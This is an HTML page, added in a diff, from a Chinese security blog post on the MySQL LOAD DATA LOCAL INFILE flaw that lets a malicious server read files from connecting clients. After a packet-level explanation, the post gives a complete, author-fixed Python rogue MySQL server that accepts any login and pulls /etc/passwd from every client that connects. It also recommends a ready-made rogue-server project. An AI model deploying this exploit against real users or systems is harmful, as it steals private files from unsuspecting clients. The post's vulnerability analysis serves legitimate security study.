@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MySQL LOAD DATA 读取客户端任意文件一、漏洞简介LOAD DATA INFILEmysql的LOAD DATAINFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是： load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table TestTable fields terminated by &#39;分隔符&amp;#39">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="MySQL LOAD DATA 读取客户端任意文件一、漏洞简介LOAD DATA INFILEmysql的LOAD DATAINFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是： load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table TestTable fields terminated by &#39;分隔符&amp;#39">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId23.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId39.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId42.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId43.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId45.png">
+<meta property="article:published_time" content="2022-07-08T06:25:59.924Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.670Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId23.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Mysql/MySQL LOAD DATA 读取客户端任意文件" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.924Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MySQL-LOAD-DATA-读取客户端任意文件"><a href="#MySQL-LOAD-DATA-读取客户端任意文件" class="headerlink" title="MySQL LOAD DATA 读取客户端任意文件"></a>MySQL LOAD DATA 读取客户端任意文件</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h3><p>mysql的LOAD DATA<br>INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是：</p>
+<pre><code>load data infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &#39;分隔符&#39;;
+load data local infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &#39;分隔符&#39;;
+</code></pre>
+<p>第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD<br>DATA LOCAL INFILE。官方文档中也提出了这个问题（PS：Google翻译的不是很准确）</p>
+<p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId23.png"></p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h3><p>测试环境：MacOS 10.14Mysql 5.7.21</p>
+<p>使用tcpdump抓取3306端口的数据包</p>
+<p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId27.png"></p>
+<h4 id="1-服务器向客户端发送greeting问候包，包含服务端banner信息"><a href="#1-服务器向客户端发送greeting问候包，包含服务端banner信息" class="headerlink" title="1.服务器向客户端发送greeting问候包，包含服务端banner信息"></a>1.服务器向客户端发送greeting问候包，包含服务端banner信息</h4><p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId29.png"></p>
+<h4 id="2-客户端发送登陆请求包，包含用户名密码，以及含有LOAD-DATA-LOCAL选项的客户端banner信息。"><a href="#2-客户端发送登陆请求包，包含用户名密码，以及含有LOAD-DATA-LOCAL选项的客户端banner信息。" class="headerlink" title="2.客户端发送登陆请求包，包含用户名密码，以及含有LOAD DATA LOCAL选项的客户端banner信息。"></a>2.客户端发送登陆请求包，包含用户名密码，以及含有LOAD DATA LOCAL选项的客户端banner信息。</h4><p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId31.png"></p>
+<h4 id="3-然后是客户端初始化的一些查询，比如select-database-select-version-comment"><a href="#3-然后是客户端初始化的一些查询，比如select-database-select-version-comment" class="headerlink" title="3.然后是客户端初始化的一些查询，比如select database(); select @@version_comment;"></a>3.然后是客户端初始化的一些查询，比如select database(); select @@version_comment;</h4><p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId33.png"></p>
+<h4 id="4-找到我们执行的LOAD-DATA-INFILE数据包，第一个包看起来比较正常，是客户端发起的Request-Que"><a href="#4-找到我们执行的LOAD-DATA-INFILE数据包，第一个包看起来比较正常，是客户端发起的Request-Que" class="headerlink" title="4.找到我们执行的LOAD DATA INFILE数据包，第一个包看起来比较正常，是客户端发起的Request Que"></a>4.找到我们执行的LOAD DATA INFILE数据包，第一个包看起来比较正常，是客户端发起的Request Que</h4><p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId35.png"></p>
+<h4 id="5-但是紧接着服务器返回了一个包含刚才所要LOAD-DATA-INFILE的文件名-Users-smi1e-Desktop-test-txt的数据包。"><a href="#5-但是紧接着服务器返回了一个包含刚才所要LOAD-DATA-INFILE的文件名-Users-smi1e-Desktop-test-txt的数据包。" class="headerlink" title="5.但是紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/Users/smi1e/Desktop/test.txt的数据包。"></a>5.但是紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/Users/smi1e/Desktop/test.txt的数据包。</h4><p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId37.png"></p>
+<h4 id="6-然后客户端向服务端发送了-Users-smi1e-Desktop-test-txt文件的内容："><a href="#6-然后客户端向服务端发送了-Users-smi1e-Desktop-test-txt文件的内容：" class="headerlink" title="6.然后客户端向服务端发送了/Users/smi1e/Desktop/test.txt文件的内容："></a>6.然后客户端向服务端发送了/Users/smi1e/Desktop/test.txt文件的内容：</h4><p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId39.png"></p>
+<p>如果我们在客户端发送查询之后，返回一个Response<br>TABULAR数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的<br>In theory, a patched server could be built that would tell the client<br>program to transfer a file of the server&#39;s choosing rather than the<br>file named by the client in the <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html">LOAD<br>DATA</a><br>statement.也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。</p>
+<p>最重要的是伪造的服务端可以在任何时候回复一个file-transfer<br>请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use<br>LOAD DATA<br>LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。</p>
+<h3 id="搭建MySQL服务端"><a href="#搭建MySQL服务端" class="headerlink" title="搭建MySQL服务端"></a>搭建MySQL服务端</h3><p>主要分为</p>
+<ul>
+<li>  向 MySQL Client 发送Server Greeting</li>
+<li>  等待 Client 端发送一个Query Package</li>
+<li>  回复一个file transfer请求</li>
+</ul>
+<p>我们需要知道如何构造File Transfer和Server<br>Greeting数据包，这些包的格式都可以在 MySQL 的官方文档上找到。</p>
+<p>File Transfer数据包格式：Protocol::LOCAL_INFILE_Request</p>
+<p>并且我们需要等待一个来自 Client<br>的查询请求，才能回复这个读文件的请求。不过我们在上面看到客户端在连接成功后会自动的做一些初始化的查询。</p>
+<p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId42.png"></p>
+<p>官方也给了exmaple</p>
+<pre><code>0c 00 00 01 fb 2f 65 74    63 2f 70 61 73 73 77 64    ...../etc/passwd
+</code></pre>
+<p>数据包的内容其实是从\xfb开始的，这个字节代表包的类型，后面紧跟要读取的文件名。前面的0x0c是数据包的长度（从<br>\xfb 开始计算），长度后面的三个字节\x00\x00\x01是数据包的序号。</p>
+<p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId43.png"></p>
+<p>Greeting数据包格式：官方文档，如果不会构造可以直接拷贝抓到的数据包然后改一下长度、文件名之类的。</p>
+<p>这里直接拷贝大佬归纳的格式。</p>
+<pre><code>&#39;\x0a&#39;,  # Protocol
+&#39;6.6.6-lightless_Mysql_Server&#39; + &#39;\0&#39;,  # Version
+&#39;\x36\x00\x00\x00&#39;,  # Thread ID
+&#39;ABCDABCD&#39; + &#39;\0&#39;,  # Salt
+&#39;\xff\xf7&#39;,  # Capabilities, CLOSE SSL HERE!
+&#39;\x08&#39;,  # Collation
+&#39;\x02\x00&#39;,  # Server Status
+&quot;\x0f\x80\x15&quot;, 
+&#39;\0&#39; * 10,  # Unknown
+&#39;ABCDABCD&#39; + &#39;\0&#39;,
+&quot;mysql_native_password&quot; + &quot;\0&quot;
+</code></pre>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>来源于<a target="_blank" rel="noopener" href="https://www.vesiluoma.com/abusing-mysql-clients/%E7%9A%84POC%EF%BC%8C%E6%B5%8B%E4%BA%86%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B0%8F%E6%97%B6%E9%83%BD%E6%B2%A1%E6%88%90%E5%8A%9F%EF%BC%8C%E6%9C%80%E5%90%8E%E5%8F%91%E7%8E%B0%E9%87%8C%E9%9D%A2">https://www.vesiluoma.com/abusing-mysql-clients/的POC，测了一个多小时都没成功，最后发现里面</a><br>#3payload写错了，我给改了下。</p>
+<pre><code>#!/usr/bin/python
+#coding: utf8
+import socket
+
+# linux :
+#filestring = &quot;/etc/passwd&quot;
+# windows:
+#filestring = &quot;C:\Windows\system32\drivers\etc\hosts&quot;
+HOST = &quot;0.0.0.0&quot; # open for eeeeveryone! ^_^
+PORT = 3306
+BUFFER_SIZE = 1024
+
+#1 Greeting
+greeting = &quot;\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;
+#2 Accept all authentications
+authok = &quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;
+
+#3 Payload
+#数据包长度
+payloadlen = &quot;\x0c&quot;
+padding = &quot;\x00\x00&quot;
+payload = payloadlen + padding +  &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((HOST, PORT))
+s.listen(1)
+
+while True:
+    conn, addr = s.accept()
+
+    print &#39;Connection from:&#39;, addr
+    conn.send(greeting)
+    while True:
+        data = conn.recv(BUFFER_SIZE)
+        print &quot; &quot;.join(&quot;%02x&quot; % ord(i) for i in data)
+        conn.send(authok)
+        data = conn.recv(BUFFER_SIZE)
+        conn.send(payload)
+        print &quot;[*] Payload send!&quot;
+        data = conn.recv(BUFFER_SIZE)
+        if not data: break
+        print &quot;Data received:&quot;, data
+        break
+    # Don&#39;t leave the connection open.
+    conn.close()
+</code></pre>
+<p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId45.png"></p>
+<p>ps: 实测 下面这个项目比较好用，上面的poc还需要改长度和内容的16进制值Github还有一个项目：<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<p>该特性适用于：MySQL Client、 PHP with mysqli、Python with<br>MySQLdb、Python3 with mysqlclient、Java with JDBC Driver等。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" data-id="cl5c2qssi00c0y8v19wl52ow6" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/MyBB/resource/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890&CVE-2021-27889)/media/1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
